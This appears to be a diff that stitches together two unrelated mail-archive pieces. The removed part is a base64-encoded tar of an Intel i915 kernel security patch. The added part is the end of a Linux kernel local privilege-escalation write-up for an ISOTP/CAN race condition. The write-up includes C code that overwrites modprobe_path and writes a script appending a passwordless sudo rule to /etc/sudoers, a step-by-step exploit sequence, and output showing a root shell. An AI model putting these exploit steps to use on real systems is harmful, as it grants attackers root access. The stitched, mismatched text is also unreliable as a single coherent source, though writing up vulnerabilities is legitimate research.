-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkcm0taW50ZWwtZml4ZXMvMDAw
-MS1kcm0taTkxNS1maXgtVExCLWludmFsaWRhdGlvbi1mb3ItR2VuMTItdmlk
-ZW8tYW5kLWNvLnBhdGNoAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDAwMDY2NAAw
-MDAxNzUxADAwMDE3NTEAMDAwMDAwMDMwMjIAMTQzNDE2MjYzMjMAMDI0MjY1
-ACAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAHVzdGFyICAAYWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAABhaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEZy
-b20gZjAyMTlkYjZhMGZkZDY4YTkyZGY5YzUyOWVlYjlhMTcyMGM4MDQ4NiBN
-b24gU2VwIDE3IDAwOjAwOjAwIDIwMDEKRnJvbTogQW5kcnplaiBIYWpkYSA8
-YW5kcnplai5oYWpkYUBpbnRlbC5jb20+CkRhdGU6IE1vbiwgMTQgTm92IDIw
-MjIgMTE6Mzg6MjQgKzAxMDAKU3ViamVjdDogW1BBVENIXSBkcm0vaTkxNTog
-Zml4IFRMQiBpbnZhbGlkYXRpb24gZm9yIEdlbjEyIHZpZGVvIGFuZCBjb21w
-dXRlCiBlbmdpbmVzCk9yZ2FuaXphdGlvbjogSW50ZWwgVGVjaG5vbG9neSBQ
-b2xhbmQgc3AuIHogby5vLiAtIHVsLiBTbG93YWNraWVnbyAxNzMsIDgwLTI5
-OCBHZGFuc2sgLSBLUlMgMTAxODgyIC0gTklQIDk1Ny0wNy01Mi0zMTYKCklu
-IGNhc2Ugb2YgR2VuMTIgdmlkZW8gYW5kIGNvbXB1dGUgZW5naW5lcywgVExC
-X0lOViByZWdpc3RlcnMgYXJlIG1hc2tlZCAtCnRvIG1vZGlmeSBvbmUgYml0
-LCBjb3JyZXNwb25kaW5nIGJpdCBpbiB1cHBlciBoYWxmIG9mIHRoZSByZWdp
-c3RlciBtdXN0CmJlIGVuYWJsZWQsIG90aGVyd2lzZSBub3RoaW5nIGhhcHBl
-bnMuCgpDVkU6IENWRS0yMDIyLTQxMzkKU3VnZ2VzdGVkLWJ5OiBDaHJpcyBX
-aWxzb24gPGNocmlzLnAud2lsc29uQGludGVsLmNvbT4KU2lnbmVkLW9mZi1i
-eTogQW5kcnplaiBIYWpkYSA8YW5kcnplai5oYWpkYUBpbnRlbC5jb20+CkFj
-a2VkLWJ5OiBEYW5pZWwgVmV0dGVyIDxkYW5pZWwudmV0dGVyQGZmd2xsLmNo
-PgpGaXhlczogNzkzOGQ2MTU5MWQzICgiZHJtL2k5MTU6IEZsdXNoIFRMQnMg
-YmVmb3JlIHJlbGVhc2luZyBiYWNraW5nIHN0b3JlIikKQ2M6IHN0YWJsZUB2
-Z2VyLmtlcm5lbC5vcmcKLS0tCiBkcml2ZXJzL2dwdS9kcm0vaTkxNS9ndC9p
-bnRlbF9ndC5jIHwgNSArKysrKwogMSBmaWxlIGNoYW5nZWQsIDUgaW5zZXJ0
-aW9ucygrKQoKZGlmZiAtLWdpdCBhL2RyaXZlcnMvZ3B1L2RybS9pOTE1L2d0
-L2ludGVsX2d0LmMgYi9kcml2ZXJzL2dwdS9kcm0vaTkxNS9ndC9pbnRlbF9n
-dC5jCmluZGV4IGQwYjAzYTkyOGI5YWNhLi41YzkzMWI2Njk2YzMyNyAxMDA2
-NDQKLS0tIGEvZHJpdmVycy9ncHUvZHJtL2k5MTUvZ3QvaW50ZWxfZ3QuYwor
-KysgYi9kcml2ZXJzL2dwdS9kcm0vaTkxNS9ndC9pbnRlbF9ndC5jCkBAIC0x
-MDE3LDYgKzEwMTcsMTEgQEAgc3RhdGljIHZvaWQgbW1pb19pbnZhbGlkYXRl
-X2Z1bGwoc3RydWN0IGludGVsX2d0ICpndCkKIAkJaWYgKCFpOTE1X21taW9f
-cmVnX29mZnNldChyYi5yZWcpKQogCQkJY29udGludWU7CiAKKwkJaWYgKEdS
-QVBISUNTX1ZFUihpOTE1KSA9PSAxMiAmJiAoZW5naW5lLT5jbGFzcyA9PSBW
-SURFT19ERUNPREVfQ0xBU1MgfHwKKwkJICAgIGVuZ2luZS0+Y2xhc3MgPT0g
-VklERU9fRU5IQU5DRU1FTlRfQ0xBU1MgfHwKKwkJICAgIGVuZ2luZS0+Y2xh
-c3MgPT0gQ09NUFVURV9DTEFTUykpCisJCQlyYi5iaXQgPSBfTUFTS0VEX0JJ
-VF9FTkFCTEUocmIuYml0KTsKKwogCQlpbnRlbF91bmNvcmVfd3JpdGVfZnco
-dW5jb3JlLCByYi5yZWcsIHJiLmJpdCk7CiAJCWF3YWtlIHw9IGVuZ2luZS0+
-bWFzazsKIAl9Ci0tIAoyLjM0LjEKCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAA=
+The ROP chain consists of a technique to overwrite `modprobe_path`. In case any user wants to execute
+a file with an invalid file signature, the program at `modprobe_path` will be executed with root privileges.
+This technique was apparently used in some CTF challenges and it was thoroughly described by *lkmidas*
+in his blog. In case you want to learn about it in depth, check out his well-written article.
+Once we have overwritten `modprobe_path`, the kernel thread will be stopped in `do_task_dead()` ``[1]``.
+This step is needed as we are already done with exploiting the kernel, and any further
+execution of our hijacked kernel thread might result in severe kernel crashes.
 
---------------nomOFMI0Uix6mYcU6zhgBIbg--
+```c
+ret = system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy;		[1]
+	chmod +x /tmp/dummy");
+if (ret != 0)
+	die("/tmp/dummy creation failed");
+
+ret = system("echo '#!/bin/sh' > /tmp/x; \
+	echo 'echo \"noprivs ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers'	[2]
+		>> /tmp/x; chmod +x /tmp/x");
+if (ret != 0)
+	die("/tmp/x creation failed");
+```
+
+In short, I create a file ``/tmp/dummy`` ``[1]`` with the invalid signature ``0xff 0xff 0xff 0xff``.
+I also create a file ``/tmp/x`` ``[2]`` which is the overwritten `modprobe_path`. This small
+shell script will add the unprivileged user to ``/etc/sudoers``, allowing to escalate the user's
+privileges to root.
+
+### Combining everything together
+
+At this place, I covered all of the steps which now have to be combined.
+The following sequence is used in my exploit:
+
+- trigger warning to retrieve kernel addresses from kernel logs
+
+- setup FUSE filesystem and allocate memory with `mmap()`
+
+- setup user namespace to autoload VCAN and ISOTP modules
+
+- setup CAN networking device with VCAN
+
+- open ISOTP socket 1
+	- this socket will be exploited with the race condition
+
+- open ISOTP socket 2
+	- this socket will only be used to send a CAN message to socket 1
+
+- win race condition on socket 1
+
+- close socket 1
+
+- spray the page allocator with `setxattr()` containing our payload to overwrite socket 1
+
+- send CAN message from socket 2 to socket 1
+
+- `isotp_rcv()` is run as software interrupt for socket 1
+
+- in `isotp_rcv()`, pass checks and call malicious `sk_error_report()` pointer to perform the stack
+  pivot
+
+- stack pivot leads to ROP chain execution at `struct isotp_sock`
+
+- execute extended ROP chain, overwrite `modprobe_path`
+
+- try executing `/tmp/dummy`, `/tmp/x` will be executed with root privileges
+
+- the unprivileged user is now added to `/etc/sudoers` and we can now get a **root shell**
+
+Exploit output
+
+```
+noprivs@suse:~/expl> uname -a
+Linux suse 5.12.0-1-default #1 SMP Mon Apr 26 04:25:46 UTC 2021 (5d43652) x86_64 x86_64 x86_64 GNU/Linux
+noprivs@suse:~/expl> ./lpe
+[+] entering setsockopt
+[+] entering bind
+[+] left bind with ret = 0
+[+] left setsockopt with flags = 838
+[+] race condition hit, closing and spraying socket
+[+] sending msg to run softirq with isotp_rcv()
+[+] check sudo su for root rights
+noprivs@suse:~/expl> sudo su
+suse:/home/noprivs/expl # id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Notice
+
+Researching and exploiting the vulnerability  was a great opportunity to expand my knowledge about
+the Linux kernel.
+I hope you enjoyed the article. In case of further questions feel free to reach out to me by
+writing me an e-mail (nslusarek@gmx.net).
+
+Also, I'm currently looking for an internship in infosec in Germany/Europe. In case you are
+interested, please reach out to me via e-mail.
+
+## References
+
+https://bugs.chromium.org/p/project-zero/issues/detail?id=808
+
+https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/
+
+https://www.openwall.com/lists/oss-security/2021/05/11/16
+
+--NzB8fVQJ5HfG6fxh--
